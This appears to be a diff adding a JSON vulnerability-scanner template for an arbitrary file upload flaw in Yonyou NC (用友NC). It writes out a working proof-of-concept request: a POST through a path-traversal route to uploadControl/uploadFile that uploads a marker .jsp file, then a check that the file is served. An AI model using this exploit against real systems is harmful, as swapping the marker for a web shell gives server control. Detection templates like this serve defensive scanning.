@@ -1,0 +1,45 @@
+{
+  "product": "用友NC",
+  "vul_name": "用友NC uploadControl uploadFile接口文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC mp接口存在文件上传漏洞，攻击者可在授权情况上传任意文件，进而获取服务器控制权限。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/mp/login/../uploadControl/uploadFile ",
+      "file": {
+        "file": [
+          "52e039302a62d077.jsp",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "application/octet-stream"
+        ]
+      },
+      "data": {
+        "submit": "上传"
+      }
+    },
+    "verify": {
+      "path": "/mp/uploadFileDir/52e039302a62d077.jsp",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
